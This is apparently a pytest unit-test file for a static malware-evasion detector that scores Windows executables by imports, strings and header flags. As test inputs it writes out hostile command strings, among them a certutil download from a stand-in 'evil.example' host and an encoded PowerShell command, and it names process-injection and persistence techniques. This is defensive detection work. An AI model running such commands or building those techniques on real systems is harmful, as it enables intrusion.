"""Unit tests for scarabeo/evasion.py — static evasion heuristics."""

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))
from scarabeo.evasion import (
    EvasionIndicator,
    EvasionProfile,
    analyze_imports,
    analyze_metadata,
    analyze_strings,
    build_evasion_profile,
    compute_score,
    evasion_profile_to_findings,
)


# ── Fixtures / helpers ────────────────────────────────────────────────────────

def _imp(dll: str, fns: list[str]) -> dict:
    return {"dll": dll, "functions": fns}


def _profile(imports=None, strings=None, metadata=None) -> EvasionProfile:
    return build_evasion_profile(
        imports=imports or [],
        strings=strings or [],
        metadata=metadata,
    )


def _clean_meta(
    dll_chars: int = 0x0140,    # DYNAMIC_BASE | NX_COMPAT
    sections: list | None = None,
    packers: list | None = None,
    ts_anomaly=None,
    import_count: int = 20,
    subsystem_code: int = 3,    # Windows CUI
) -> dict:
    """Return a 'clean' PE metadata dict with safe defaults."""
    return {
        "dll_characteristics": dll_chars,
        "sections":            sections or [],
        "packers":             packers or [],
        "timestamp_anomaly":   ts_anomaly,
        "import_count":        import_count,
        "subsystem_code":      subsystem_code,
    }


# ── analyze_imports ───────────────────────────────────────────────────────────

class TestAnalyzeImports:
    def test_no_imports_returns_empty(self):
        assert analyze_imports([]) == []

    def test_benign_imports_not_flagged(self):
        imports = [_imp("gdi32.dll", ["CreateDC", "DeleteDC", "BitBlt"])]
        assert analyze_imports(imports) == []

    def test_debugger_presence_detected(self):
        imports = [_imp("kernel32.dll", ["IsDebuggerPresent", "ExitProcess"])]
        indicators = analyze_imports(imports)
        cats = {i.category for i in indicators}
        assert "anti_debug" in cats

    def test_timing_check_detected(self):
        imports = [_imp("kernel32.dll", ["GetTickCount", "QueryPerformanceCounter"])]
        indicators = analyze_imports(imports)
        techniques = {i.technique for i in indicators}
        assert "anti_debug.timing_check" in techniques

    def test_classic_injection_detected(self):
        imports = [_imp("kernel32.dll", ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"])]
        indicators = analyze_imports(imports)
        cats = {i.category for i in indicators}
        assert "injection" in cats

    def test_ntdll_native_injection_detected(self):
        imports = [_imp("ntdll.dll", ["NtCreateThreadEx", "NtWriteVirtualMemory"])]
        indicators = analyze_imports(imports)
        techniques = {i.technique for i in indicators}
        assert "injection.nt_thread" in techniques
        assert "injection.nt_memory" in techniques

    def test_process_hollowing_detected(self):
        imports = [
            _imp("ntdll.dll", ["NtUnmapViewOfSection"]),
            _imp("kernel32.dll", ["CreateProcess", "ResumeThread"]),
        ]
        indicators = analyze_imports(imports)
        techniques = {i.technique for i in indicators}
        assert "injection.process_hollowing" in techniques

    def test_token_manipulation_detected(self):
        imports = [_imp("advapi32.dll", ["AdjustTokenPrivileges", "OpenProcessToken"])]
        indicators = analyze_imports(imports)
        cats = {i.category for i in indicators}
        assert "privesc" in cats

    def test_registry_persistence_detected(self):
        imports = [_imp("advapi32.dll", ["RegSetValueExA", "RegCreateKeyA"])]
        indicators = analyze_imports(imports)
        techniques = {i.technique for i in indicators}
        assert "persistence.registry_write" in techniques

    def test_service_installation_detected(self):
        imports = [_imp("advapi32.dll", ["OpenSCManagerA", "CreateServiceA"])]
        indicators = analyze_imports(imports)
        techniques = {i.technique for i in indicators}
        assert "persistence.service_install" in techniques

    def test_network_socket_ops_detected(self):
        imports = [_imp("ws2_32.dll", ["socket", "connect", "send", "recv"])]
        indicators = analyze_imports(imports)
        cats = {i.category for i in indicators}
        assert "network" in cats

    def test_http_client_detected(self):
        imports = [_imp("winhttp.dll", ["WinHttpOpen", "WinHttpConnect"])]
        indicators = analyze_imports(imports)
        cats = {i.category for i in indicators}
        assert "network" in cats

    def test_thread_hiding_detected(self):
        imports = [_imp("ntdll.dll", ["NtSetInformationThread"])]
        indicators = analyze_imports(imports)
        techniques = {i.technique for i in indicators}
        assert "anti_debug.thread_hiding" in techniques

    def test_evidence_contains_matched_functions(self):
        imports = [_imp("kernel32.dll", ["IsDebuggerPresent", "CreateToolhelp32Snapshot"])]
        indicators = analyze_imports(imports)
        all_evidence = {e for ind in indicators for e in ind.evidence}
        assert "IsDebuggerPresent" in all_evidence

    def test_case_sensitivity_dll_name(self):
        imports = [_imp("KERNEL32.DLL", ["IsDebuggerPresent"])]
        indicators = analyze_imports(imports)
        assert any(i.category == "anti_debug" for i in indicators)

    def test_indicator_source_is_imports(self):
        imports = [_imp("ntdll.dll", ["NtCreateThreadEx"])]
        indicators = analyze_imports(imports)
        assert all(i.source == "imports" for i in indicators)

    def test_confidence_at_least_50(self):
        imports = [_imp("kernel32.dll", ["IsDebuggerPresent"])]
        indicators = analyze_imports(imports)
        assert all(i.confidence >= 50 for i in indicators)

    def test_confidence_increases_with_evidence(self):
        few = analyze_imports([_imp("kernel32.dll", ["IsDebuggerPresent"])])
        many = analyze_imports([_imp("kernel32.dll", [
            "IsDebuggerPresent", "CheckRemoteDebuggerPresent",
            "DebugBreak", "OutputDebugStringA",
        ])])
        few_conf  = next((i.confidence for i in few  if i.technique == "anti_debug.debugger_presence"), 0)
        many_conf = next((i.confidence for i in many if i.technique == "anti_debug.debugger_presence"), 0)
        assert many_conf >= few_conf

    def test_shell32_process_hollowing_detected(self):
        imports = [_imp("shell32.dll", ["ShellExecuteA"])]
        indicators = analyze_imports(imports)
        techniques = {i.technique for i in indicators}
        assert "injection.process_hollowing" in techniques

    def test_msvcrt_system_detected(self):
        imports = [_imp("msvcrt.dll", ["system"])]
        indicators = analyze_imports(imports)
        techniques = {i.technique for i in indicators}
        assert "injection.function_resolution" in techniques


# ── analyze_strings ───────────────────────────────────────────────────────────

class TestAnalyzeStrings:
    def test_empty_strings_returns_empty(self):
        assert analyze_strings([]) == []

    def test_vm_artifact_detected(self):
        strings = ["vmtoolsd.exe", "normal string", "other"]
        indicators = analyze_strings(strings)
        cats = {i.category for i in indicators}
        assert "anti_vm" in cats

    def test_vbox_artifact_detected(self):
        strings = ["VBoxService.exe running"]
        indicators = analyze_strings(strings)
        assert any("anti_vm" == i.category for i in indicators)

    def test_qemu_artifact_detected(self):
        strings = ["running under QEMU hypervisor"]
        indicators = analyze_strings(strings)
        cats = {i.category for i in indicators}
        assert "anti_vm" in cats

    def test_sandbox_tool_detected(self):
        strings = ["wireshark.exe", "procmon.exe"]
        indicators = analyze_strings(strings)
        cats = {i.category for i in indicators}
        assert "anti_sandbox" in cats

    def test_cuckoo_detected(self):
        strings = ["cuckoomon.dll loaded at runtime"]
        indicators = analyze_strings(strings)
        assert any("anti_sandbox" == i.category for i in indicators)

    def test_joesandbox_detected(self):
        strings = ["running under joesandbox environment"]
        indicators = analyze_strings(strings)
        cats = {i.category for i in indicators}
        assert "anti_sandbox" in cats

    def test_privilege_string_detected(self):
        strings = ["requesting SeDebugPrivilege for process access"]
        indicators = analyze_strings(strings)
        assert any("privesc" == i.category for i in indicators)

    def test_autorun_registry_key_detected(self):
        strings = [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"]
        indicators = analyze_strings(strings)
        assert any("persistence" == i.category for i in indicators)

    def test_image_file_execution_options_detected(self):
        strings = [r"software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"]
        indicators = analyze_strings(strings)
        cats = {i.category for i in indicators}
        assert "persistence" in cats

    def test_c2_pattern_detected(self):
        strings = ["executing cmd.exe /c whoami > result.txt"]
        indicators = analyze_strings(strings)
        cats = {i.category for i in indicators}
        assert "network" in cats

    def test_powershell_c2_detected(self):
        strings = ["powershell -encodedcommand aGVsbG8="]
        indicators = analyze_strings(strings)
        cats = {i.category for i in indicators}
        assert "network" in cats

    def test_certutil_download_detected(self):
        strings = ["certutil -urlcache -split -f http://evil.example/a.exe"]
        indicators = analyze_strings(strings)
        cats = {i.category for i in indicators}
        assert "network" in cats

    def test_case_insensitive_matching(self):
        strings = ["VMTOOLSD.EXE detected in process list"]
        indicators = analyze_strings(strings)
        assert any("anti_vm" == i.category for i in indicators)

    def test_indicator_source_is_strings(self):
        strings = ["vmtoolsd.exe"]
        indicators = analyze_strings(strings)
        assert all(i.source == "strings" for i in indicators)

    def test_rootkit_strings_detected(self):
        strings = ["opening \\Device\\PhysicalMemory for DKOM"]
        indicators = analyze_strings(strings)
        cats = {i.category for i in indicators}
        assert "stealth" in cats

    def test_benign_strings_not_flagged(self):
        strings = ["Hello World", "error opening file", "version 1.2.3"]
        indicators = analyze_strings(strings)
        assert indicators == []

    def test_beingdebugged_peb_pattern(self):
        strings = ["check BeingDebugged flag in PEB"]
        indicators = analyze_strings(strings)
        cats = {i.category for i in indicators}
        assert "anti_debug" in cats


# ── analyze_metadata ──────────────────────────────────────────────────────────

class TestAnalyzeMetadata:
    def test_clean_pe_returns_empty(self):
        """A well-formed modern PE (ASLR + DEP set, no packers) triggers nothing."""
        meta = _clean_meta(dll_chars=0x0140)
        assert analyze_metadata(meta) == []

    def test_aslr_disabled_detected(self):
        # DYNAMIC_BASE (0x0040) not set → ASLR disabled
        meta = _clean_meta(dll_chars=0x0100)   # only NX_COMPAT set
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "anti_forensics.aslr_disabled" in techniques

    def test_dep_disabled_detected(self):
        # NX_COMPAT (0x0100) not set → DEP disabled
        meta = _clean_meta(dll_chars=0x0040)   # only DYNAMIC_BASE set
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "injection.dep_disabled" in techniques

    def test_seh_disabled_detected(self):
        # NO_SEH (0x0800) set
        meta = _clean_meta(dll_chars=0x0940)   # DYNAMIC_BASE | NX_COMPAT | NO_SEH
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "anti_debug.seh_disabled" in techniques

    def test_packer_section_names_detected(self):
        meta = _clean_meta(packers=["upx"])
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "packer.section_names" in techniques

    def test_packer_evidence_contains_name(self):
        meta = _clean_meta(packers=["upx", "vmprotect"])
        indicators = analyze_metadata(meta)
        packer_ind = next(i for i in indicators if i.technique == "packer.section_names")
        assert "upx" in packer_ind.evidence
        assert "vmprotect" in packer_ind.evidence

    def test_high_entropy_section_detected(self):
        sections = [{"name": ".packed", "entropy": 7.8, "raw_size": 4096, "characteristics": 0}]
        meta = _clean_meta(sections=sections)
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "packer.high_entropy" in techniques

    def test_low_entropy_section_not_flagged(self):
        sections = [{"name": ".text", "entropy": 6.2, "raw_size": 4096, "characteristics": 0}]
        meta = _clean_meta(sections=sections)
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "packer.high_entropy" not in techniques

    def test_zero_raw_size_section_not_flagged(self):
        # High entropy but raw_size == 0 means uninitialized: not packed
        sections = [{"name": ".bss", "entropy": 7.9, "raw_size": 0, "characteristics": 0}]
        meta = _clean_meta(sections=sections)
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "packer.high_entropy" not in techniques

    def test_rwx_section_detected(self):
        # Execute(0x20000000) | Read(0x40000000) | Write(0x80000000)
        rwx_chars = 0x20000000 | 0x40000000 | 0x80000000
        sections = [{"name": ".evil", "entropy": 6.0, "raw_size": 4096, "characteristics": rwx_chars}]
        meta = _clean_meta(sections=sections)
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "injection.rwx_section" in techniques

    def test_rx_only_section_not_flagged_as_rwx(self):
        # Execute | Read, no Write
        rx_chars = 0x20000000 | 0x40000000
        sections = [{"name": ".text", "entropy": 6.0, "raw_size": 4096, "characteristics": rx_chars}]
        meta = _clean_meta(sections=sections)
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "injection.rwx_section" not in techniques

    def test_timestamp_anomaly_detected(self):
        ts = {"type": "zero_timestamp", "description": "PE timestamp is zero"}
        meta = _clean_meta(ts_anomaly=ts)
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "anti_forensics.timestamp_anomaly" in techniques

    def test_future_timestamp_detected(self):
        ts = {"type": "future_timestamp", "description": "timestamp is in the future"}
        meta = _clean_meta(ts_anomaly=ts)
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "anti_forensics.timestamp_anomaly" in techniques

    def test_minimal_imports_detected(self):
        meta = _clean_meta(import_count=1, subsystem_code=3)
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "anti_debug.minimal_imports" in techniques

    def test_minimal_imports_not_flagged_with_packer(self):
        # Packed binary with few imports is expected — not suspicious
        meta = _clean_meta(import_count=1, packers=["upx"], subsystem_code=3)
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "anti_debug.minimal_imports" not in techniques

    def test_minimal_imports_not_flagged_for_native_subsystem(self):
        # Native / driver subsystem can legitimately have few imports
        meta = _clean_meta(import_count=1, subsystem_code=1)
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "anti_debug.minimal_imports" not in techniques

    def test_dll_char_flags_skipped_for_native(self):
        # Kernel-mode components (subsystem 1) should not be flagged for
        # missing ASLR/DEP — those flags have no meaning there.
        meta = _clean_meta(dll_chars=0x0000, subsystem_code=1)
        indicators = analyze_metadata(meta)
        techniques = {i.technique for i in indicators}
        assert "anti_forensics.aslr_disabled" not in techniques
        assert "injection.dep_disabled" not in techniques

    def test_indicator_source_is_metadata(self):
        meta = _clean_meta(dll_chars=0x0000)   # ASLR + DEP disabled
        indicators = analyze_metadata(meta)
        assert all(i.source == "metadata" for i in indicators)

    def test_multiple_high_entropy_sections_raise_confidence(self):
        one = [{"name": ".a", "entropy": 7.5, "raw_size": 1024, "characteristics": 0}]
        three = [
            {"name": ".a", "entropy": 7.5, "raw_size": 1024, "characteristics": 0},
            {"name": ".b", "entropy": 7.6, "raw_size": 1024, "characteristics": 0},
            {"name": ".c", "entropy": 7.7, "raw_size": 1024, "characteristics": 0},
        ]
        ind_one   = next(i for i in analyze_metadata(_clean_meta(sections=one))   if i.technique == "packer.high_entropy")
        ind_three = next(i for i in analyze_metadata(_clean_meta(sections=three)) if i.technique == "packer.high_entropy")
        assert ind_three.confidence >= ind_one.confidence


# ── compute_score ─────────────────────────────────────────────────────────────

class TestComputeScore:
    def test_no_indicators_score_zero(self):
        assert compute_score([]) == 0

    def test_single_low_category_low_score(self):
        inds = [EvasionIndicator(category="network", technique="network.http_client",
                                  source="imports", evidence=["WinHttpOpen"])]
        score = compute_score(inds)
        assert 1 <= score <= 30

    def test_injection_gives_high_score(self):
        inds = [
            EvasionIndicator(category="injection", technique="injection.nt_thread",
                              source="imports", evidence=["NtCreateThreadEx"]),
            EvasionIndicator(category="injection", technique="injection.memory_ops",
                              source="imports", evidence=["VirtualAllocEx"]),
        ]
        score = compute_score(inds)
        assert score >= 25

    def test_score_never_exceeds_100(self):
        inds = [
            EvasionIndicator(category=cat, technique=f"{cat}.x", source="imports", evidence=["x"])
            for cat in ["anti_debug", "anti_vm", "anti_sandbox", "injection",
                        "privesc", "persistence", "network", "stealth"] * 5
        ]
        score = compute_score(inds)
        assert score <= 100

    def test_more_categories_higher_score(self):
        one_cat = [EvasionIndicator(category="anti_debug", technique="t", source="imports", evidence=["x"])]
        two_cat = [
            EvasionIndicator(category="anti_debug", technique="t1", source="imports", evidence=["x"]),
            EvasionIndicator(category="injection",  technique="t2", source="imports", evidence=["y"]),
        ]
        assert compute_score(two_cat) > compute_score(one_cat)


# ── Score breakdown ───────────────────────────────────────────────────────────

class TestScoreBreakdown:
    def test_empty_profile_empty_breakdown(self):
        p = build_evasion_profile(imports=[], strings=[])
        assert p.score_breakdown == {}

    def test_breakdown_keys_match_indicator_categories(self):
        p = _profile(imports=[_imp("kernel32.dll", ["IsDebuggerPresent"])])
        assert "anti_debug" in p.score_breakdown

    def test_breakdown_values_are_positive(self):
        p = _profile(imports=[
            _imp("kernel32.dll", ["IsDebuggerPresent"]),
            _imp("ws2_32.dll", ["socket"]),
        ])
        assert all(v > 0 for v in p.score_breakdown.values())

    def test_breakdown_sum_approximates_score(self):
        p = _profile(imports=[
            _imp("kernel32.dll", ["IsDebuggerPresent", "VirtualAllocEx"]),
            _imp("advapi32.dll", ["AdjustTokenPrivileges"]),
            _imp("ws2_32.dll", ["socket"]),
        ])
        # breakdown sum may differ from score due to cap at 100, but should
        # be in the same order of magnitude
        breakdown_sum = sum(p.score_breakdown.values())
        assert abs(breakdown_sum - p.score) <= 30

    def test_metadata_adds_categories_to_breakdown(self):
        meta = _clean_meta(dll_chars=0x0000)   # ASLR + DEP disabled
        p = _profile(metadata=meta)
        assert "anti_forensics" in p.score_breakdown or "injection" in p.score_breakdown


# ── EvasionProfile properties ─────────────────────────────────────────────────

class TestEvasionProfileProperties:
    def test_has_anti_debug_true(self):
        p = _profile(imports=[_imp("kernel32.dll", ["IsDebuggerPresent"])])
        assert p.has_anti_debug is True

    def test_has_anti_debug_false(self):
        p = _profile(imports=[_imp("ws2_32.dll", ["socket"])])
        assert p.has_anti_debug is False

    def test_has_injection_true(self):
        p = _profile(imports=[_imp("kernel32.dll", ["CreateRemoteThread", "VirtualAllocEx"])])
        assert p.has_injection is True

    def test_has_anti_vm_from_strings(self):
        p = _profile(strings=["vmtoolsd.exe running"])
        assert p.has_anti_vm is True

    def test_has_persistence_true(self):
        p = _profile(imports=[_imp("advapi32.dll", ["RegSetValueExA"])])
        assert p.has_persistence is True

    def test_empty_profile_all_false(self):
        p = _profile()
        assert p.score == 0
        assert p.has_anti_debug is False
        assert p.has_injection is False
        assert p.has_anti_vm is False


# ── build_evasion_profile ─────────────────────────────────────────────────────

class TestBuildEvasionProfile:
    def test_combines_import_and_string_indicators(self):
        p = build_evasion_profile(
            imports=[_imp("kernel32.dll", ["IsDebuggerPresent"])],
            strings=["vmtoolsd.exe"],
        )
        cats = {i.category for i in p.indicators}
        assert "anti_debug" in cats
        assert "anti_vm" in cats

    def test_score_is_positive_when_indicators_present(self):
        p = build_evasion_profile(
            imports=[_imp("ntdll.dll", ["NtCreateThreadEx"])],
            strings=[],
        )
        assert p.score > 0

    def test_score_zero_with_no_indicators(self):
        p = build_evasion_profile(imports=[], strings=[])
        assert p.score == 0

    def test_metadata_none_accepted(self):
        """Passing metadata=None is the default and must not raise."""
        p = build_evasion_profile(imports=[], strings=[], metadata=None)
        assert p.score == 0

    def test_metadata_adds_indicators(self):
        no_meta  = build_evasion_profile(
            imports=[_imp("kernel32.dll", ["IsDebuggerPresent"])],
            strings=[],
        )
        with_meta = build_evasion_profile(
            imports=[_imp("kernel32.dll", ["IsDebuggerPresent"])],
            strings=[],
            metadata=_clean_meta(dll_chars=0x0000),   # ASLR + DEP disabled
        )
        assert len(with_meta.indicators) > len(no_meta.indicators)

    def test_metadata_increases_score(self):
        no_meta   = build_evasion_profile(imports=[], strings=[])
        with_meta = build_evasion_profile(
            imports=[],
            strings=[],
            metadata=_clean_meta(
                dll_chars=0x0000,
                ts_anomaly={"type": "zero_timestamp", "description": "zero"},
                packers=["upx"],
            ),
        )
        assert with_meta.score > no_meta.score

    def test_all_three_sources_combined(self):
        p = build_evasion_profile(
            imports=[_imp("kernel32.dll", ["IsDebuggerPresent"])],
            strings=["vmtoolsd.exe"],
            metadata=_clean_meta(
                packers=["upx"],
                sections=[{"name": ".upx1", "entropy": 7.8, "raw_size": 1024, "characteristics": 0}],
            ),
        )
        sources = {i.source for i in p.indicators}
        assert "imports"  in sources
        assert "strings"  in sources
        assert "metadata" in sources

    def test_realistic_rat_profile(self):
        """RAT-like import profile should trigger injection + network + persistence."""
        imports = [
            _imp("kernel32.dll", [
                "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
                "CreateToolhelp32Snapshot", "Process32First",
            ]),
            _imp("advapi32.dll", ["RegSetValueExA", "AdjustTokenPrivileges"]),
            _imp("ws2_32.dll",   ["socket", "connect", "send", "recv"]),
        ]
        p = build_evasion_profile(imports=imports, strings=[])
        assert p.has_injection
        assert p.has_persistence
        assert p.has_network_c2
        assert p.score >= 30


# ── evasion_profile_to_findings ───────────────────────────────────────────────

class TestEvasionProfileToFindings:
    def test_empty_profile_returns_empty(self):
        p = EvasionProfile(indicators=[], score=0)
        assert evasion_profile_to_findings(p) == []

    def test_findings_have_required_fields(self):
        p = _profile(imports=[_imp("kernel32.dll", ["IsDebuggerPresent"])])
        findings = evasion_profile_to_findings(p)
        required = {"id", "title", "severity", "confidence", "description",
                    "evidence", "source", "created_at"}
        for f in findings:
            missing = required - set(f.keys())
            assert not missing, f"Finding {f.get('id')} missing: {missing}"

    def test_finding_ids_are_stable(self):
        p1 = _profile(imports=[_imp("kernel32.dll", ["IsDebuggerPresent", "VirtualAllocEx"])])
        p2 = _profile(imports=[_imp("kernel32.dll", ["IsDebuggerPresent", "VirtualAllocEx"])])
        ids1 = [f["id"] for f in evasion_profile_to_findings(p1)]
        ids2 = [f["id"] for f in evasion_profile_to_findings(p2)]
        assert ids1 == ids2

    def test_findings_sorted_by_id(self):
        imports = [
            _imp("kernel32.dll", ["IsDebuggerPresent", "VirtualAllocEx", "CreateRemoteThread"]),
            _imp("advapi32.dll", ["AdjustTokenPrivileges", "RegSetValueExA"]),
            _imp("ws2_32.dll", ["socket", "connect"]),
        ]
        p = build_evasion_profile(imports=imports, strings=["vmtoolsd.exe"])
        findings = evasion_profile_to_findings(p)
        ids = [f["id"] for f in findings]
        assert ids == sorted(ids)

    def test_no_duplicate_finding_ids(self):
        imports = [
            _imp("kernel32.dll", ["IsDebuggerPresent", "VirtualAllocEx"]),
            _imp("ntdll.dll", ["NtCreateThreadEx"]),
        ]
        p = _profile(imports=imports)
        findings = evasion_profile_to_findings(p)
        ids = [f["id"] for f in findings]
        assert len(ids) == len(set(ids)), "Finding IDs must be unique"

    def test_severity_injection_is_high(self):
        p = _profile(imports=[_imp("kernel32.dll", ["CreateRemoteThread", "VirtualAllocEx"])])
        findings = evasion_profile_to_findings(p)
        inj = [f for f in findings if "injection" in f["id"]]
        assert inj, "Should have injection finding"
        assert all(f["severity"] == "HIGH" for f in inj)

    def test_evidence_capped_at_ten(self):
        ind = EvasionIndicator(
            category="injection", technique="injection.memory_ops",
            source="imports", evidence=[f"Func{i}" for i in range(20)]
        )
        p = EvasionProfile(indicators=[ind], score=25)
        findings = evasion_profile_to_findings(p)
        for f in findings:
            assert len(f["evidence"]) <= 10

    def test_source_parameter_used(self):
        p = _profile(imports=[_imp("kernel32.dll", ["IsDebuggerPresent"])])
        findings = evasion_profile_to_findings(p, source="custom-analyzer")
        assert all(f["source"] == "custom-analyzer" for f in findings)

    def test_evasion_tags_present(self):
        p = _profile(imports=[_imp("kernel32.dll", ["IsDebuggerPresent"])])
        findings = evasion_profile_to_findings(p)
        assert all("evasion" in f["tags"] for f in findings)

    def test_metadata_finding_uses_header_field_evidence_type(self):
        meta = _clean_meta(dll_chars=0x0000)   # triggers ASLR + DEP findings
        p = _profile(metadata=meta)
        findings = evasion_profile_to_findings(p)
        meta_findings = [f for f in findings if "anti-forensics" in f["id"] or "dep" in f["id"]]
        assert meta_findings, "Expected findings from metadata indicators"
        for f in meta_findings:
            assert all(ev["type"] == "header_field" for ev in f["evidence"])

    def test_references_populated_for_known_techniques(self):
        p = _profile(imports=[_imp("kernel32.dll", ["IsDebuggerPresent"])])
        findings = evasion_profile_to_findings(p)
        dbg_finding = next(f for f in findings if "debugger-presence" in f["id"])
        assert len(dbg_finding["references"]) > 0
        assert any("attack.mitre.org" in r for r in dbg_finding["references"])
